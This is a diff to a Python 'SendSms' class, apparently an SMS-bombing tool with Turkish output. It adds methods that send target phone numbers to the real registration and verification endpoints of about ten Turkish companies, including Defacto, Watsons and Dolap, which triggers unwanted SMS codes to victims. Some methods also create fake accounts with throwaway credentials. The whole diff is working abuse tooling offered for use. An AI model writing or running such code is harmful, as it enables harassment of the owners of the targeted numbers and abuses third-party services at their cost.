@@ -238,6 +238,31 @@ class SendSms():
                 continue
             
         
+    #ceptesok.com
+    def Sok(self):
+
+        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
+        bos_olmayan = len([x for x in liste if x != "bos"])
+        uygulanan_nolar = 0
+        for numara in liste:
+            if numara != "bos":
+                try:
+                    r = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json={"mobile_number": numara, "token_type": "register_token"})
+                    if len(r.json()["meta"]["messages"]["success"]) != 0:
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.ceptesok.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        self.adet += 1
+                        self.toplam_sms += 1
+                    else:
+                        raise
+                except:
+                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.ceptesok.com "+numara)
+                uygulanan_nolar += 1
+                if uygulanan_nolar == bos_olmayan:
+                    break
+            else:
+                continue
+            
+    
     #tiklagelsin.com
     def Tiklagelsin(self):
         liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
@@ -339,6 +364,33 @@ class SendSms():
                         raise
                 except:
                     print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> sakasu.com.tr "+numara)
+                uygulanan_nolar += 1
+                if uygulanan_nolar == bos_olmayan:
+                    break
+            else:
+                continue
+            
+    
+    #rentiva.com
+    def Rentiva(self): 
+        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
+        bos_olmayan = len([x for x in liste if x != "bos"])
+        uygulanan_nolar = 0
+        for numara in liste:
+            if numara != "bos":
+                try:
+                    url = "https://rentiva.com:443/api/Account/Login"
+                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "ionic://localhost", "Accept-Encoding": "gzip, deflate", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Accept-Language": "tr-TR,tr;q=0.9"}
+                    json={"appleId": None, "code": "", "email": "", "facebookId": None, "googleId": None, "lastName": "", "name": "", "phone": numara, "type": 1}
+                    rentiva = requests.post(url, headers=headers, json=json)
+                    if rentiva.json()["success"] == True:
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> rentiva.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        self.adet += 1
+                        self.toplam_sms += 1
+                    else:
+                        raise
+                except:
+                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> rentiva.com "+numara)
                 uygulanan_nolar += 1
                 if uygulanan_nolar == bos_olmayan:
                     break
@@ -453,6 +505,86 @@ class SendSms():
                 continue
             
     
+    #yaanimail.com
+    def Yaani(self):
+            
+        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
+        bos_olmayan = len([x for x in liste if x != "bos"])
+        uygulanan_nolar = 0
+        for numara in liste:
+            if numara != "bos":
+                try:
+                    url = "https://api.yaanimail.com:443/gateway/v1/accounts/verification-code/send"
+                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Content-Type": "application/json"}
+                    json={"action": "create", "email": f"{self.random_mail}@yaani.com", "language": "tr", "recovery_options": [{"type": "email", "value": self.mail}, {"type": "msisdn", "value": f"90{numara}"}]}
+                    r = requests.post(url, headers=headers, json=json)
+                    if r.status_code == 204:
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.yaanimail.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        self.adet += 1
+                        self.toplam_sms += 1
+                    else:
+                        raise
+                except:
+                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.yaanimail.com "+numara)
+                uygulanan_nolar += 1
+                if uygulanan_nolar == bos_olmayan:
+                    break
+            else:
+                continue 
+            
+             
+    #defacto.com.tr
+    def Defacto(self):
+           
+        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
+        bos_olmayan = len([x for x in liste if x != "bos"])
+        uygulanan_nolar = 0
+        for numara in liste:
+            if numara != "bos":
+                try:
+                    url = "https://www.defacto.com.tr:443/Customer/SendPhoneConfirmationSms"
+                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.defacto.com.tr/Login?newUser=True&ReturnUrl=%2FCustomer%2FSendPhoneConfirmationSms", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.defacto.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
+                    data = {"mobilePhone": numara}
+                    r = requests.post(url, headers=headers, data=data)
+                    if r.json()["Data"]["IsSMSSend"] == True:
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> defacto.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        self.adet += 1
+                        self.toplam_sms += 1
+                    else:
+                        raise
+                except:
+                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> defacto.com.tr "+numara)
+                uygulanan_nolar += 1
+                if uygulanan_nolar == bos_olmayan:
+                    break
+            else:
+                continue
+    
+    
+    #mopas.com.tr
+    def Mopas(self):          
+        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
+        bos_olmayan = len([x for x in liste if x != "bos"])
+        uygulanan_nolar = 0
+        for numara in liste:
+            if numara != "bos":
+                try:
+                    r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={numara}&pwd=&checkPwd=")
+                    if r.status_code == 200:
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mopas.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        self.adet += 1
+                        self.toplam_sms += 1
+                    else:
+                        raise
+                except:
+                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mopas.com.tr "+numara)
+                uygulanan_nolar += 1
+                if uygulanan_nolar == bos_olmayan:
+                    break
+            else:
+                continue
+            
+    
     #icq.net
     def Icq(self):
         liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
@@ -501,6 +633,34 @@ class SendSms():
                         raise
                 except:
                     print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> boyner.com "+numara)
+                uygulanan_nolar += 1
+                if uygulanan_nolar == bos_olmayan:
+                    break
+            else:
+                continue
+            
+
+    #watsons.com.tr
+    def Watsons(self):
+            
+        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
+        bos_olmayan = len([x for x in liste if x != "bos"])
+        uygulanan_nolar = 0
+        for numara in liste:
+            if numara != "bos":
+                try:
+                    url = "https://www.watsons.com.tr:443/api/v2/wtctr/phone-verification/phonenumber?lang=tr_TR"
+                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.watsons.com.tr/register", "Content-Type": "application/json;charset=UTF-8", "X-Dtpc": "11$208941126_619h150vEGITDHTLQJAGKPKRHUIMTILDMPAWJTOL-0e0", "Origin": "https://www.watsons.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Pragma": "no-cache", "Cache-Control": "no-cache", "Te": "trailers"}
+                    json={"countryCode": "TR", "phoneNumber": numara}
+                    r = requests.post(url, headers=headers, json=json)
+                    if r.status_code == 201:
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> watsons.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        self.adet += 1
+                        self.toplam_sms += 1
+                    else:
+                        raise
+                except:
+                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> watsons.com.tr "+numara)
                 uygulanan_nolar += 1
                 if uygulanan_nolar == bos_olmayan:
                     break
@@ -643,6 +803,31 @@ class SendSms():
                 continue
             
             
+    #pisir.com
+    def Pisir(self):
+            
+        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
+        bos_olmayan = len([x for x in liste if x != "bos"])
+        uygulanan_nolar = 0
+        for numara in liste:
+            if numara != "bos":
+                try:
+                    r = requests.post("https://api.pisir.com:443/v1/login/",  json={"app_build": "343", "app_platform": "ios", "msisdn": numara})
+                    if r.json()["ok"] == "1":
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.pisir.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        self.adet += 1
+                        self.toplam_sms += 1
+                    else:
+                        raise
+                except:
+                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.pisir.com "+numara)
+                uygulanan_nolar += 1
+                if uygulanan_nolar == bos_olmayan:
+                    break
+            else:
+                continue
+                
+    
     #KimGbIster
     def KimGb(self):
             
@@ -693,6 +878,35 @@ class SendSms():
                     break
             else:
                 continue
+            
+            
+    #terrapizza.com.tr
+    def Terra(self):
+            
+        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
+        bos_olmayan = len([x for x in liste if x != "bos"])
+        uygulanan_nolar = 0
+        for numara in liste:
+            if numara != "bos":
+                try:
+                    url = "https://api.terrapizza.com.tr:443/api/v1/customers"
+                    json={"email": self.mail, "emailPermitted": True, "kvkApproved": True, "name": "Memati", "phone": str(numara), "smsPermitted": True, "surname": "Bas", "userAgreementApproved": True}
+                    r = requests.post(url,  json=json)
+                    if (r.status_code) == 201:
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.terrapizza.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        self.adet += 1
+                        self.toplam_sms += 1
+                    else:
+                        raise
+                except:
+                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.terrapizza.com.tr "+numara)
+                uygulanan_nolar += 1
+                if uygulanan_nolar == bos_olmayan:
+                    break
+            else:
+                continue
+            
+
             
             
     #ipragaz.com.tr
@@ -851,6 +1065,34 @@ class SendSms():
             else:
                 continue
 
+
+    #dolap.com
+    def Dolap(self):
+            
+        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
+        bos_olmayan = len([x for x in liste if x != "bos"])
+        uygulanan_nolar = 0
+        for numara in liste:
+            if numara != "bos":
+                try:
+                    url = "https://api-gateway.dolap.com:443/member"
+                    headers = {"Content-Type": "application/json", "Accept": "*/*", "Appversion": "359", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate", "Categorygroup": "WOMAN", "Access-Token": "", "User-Agent": "dolap/2 CFNetwork/1335.0.3 Darwin/21.6.0", "Appplatform": "ios"}
+                    json={"advertisingId": "", "campaignAgreement": False, "email": self.mail, "memberCookie": "", "membershipAgreement": True, "nickName": "tingirifistik", "password": "31ABC..abc31", "phoneNumber": numara}
+                    r = requests.put(url, headers=headers, json=json)
+                    if r.status_code == 200:
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api-gateway.dolap.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        self.adet += 1
+                        self.toplam_sms += 1
+                    else:
+                        raise
+                except:
+                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api-gateway.dolap.com "+numara)
+                uygulanan_nolar += 1
+                if uygulanan_nolar == bos_olmayan:
+                    break
+            else:
+                continue
+            
 
     #heymobility.tech
     def Hey(self):
@@ -1019,7 +1261,33 @@ class SendSms():
             else:
                 continue
             
-			
+    #sakasu.com.tr
+    def Saka(self):
+            
+        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
+        bos_olmayan = len([x for x in liste if x != "bos"])
+        uygulanan_nolar = 0
+        for numara in liste:
+            if numara != "bos":
+                try:
+                    url = "https://mobilcrm2.saka.com.tr:443/api/customer/login"
+                    json={"gsm": numara}
+                    r = requests.post(url, json=json)
+                    if (r.json()["status"]) == 1 :
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobilcrm2.saka.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        self.adet += 1
+                        self.toplam_sms += 1
+                    else:
+                        raise
+                except:
+                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobilcrm2.saka.com.tr "+numara)
+                uygulanan_nolar += 1
+                if uygulanan_nolar == bos_olmayan:
+                    break
+            else:
+                continue
+            
+    
     #gofody.com
     def Gofody(self):
             
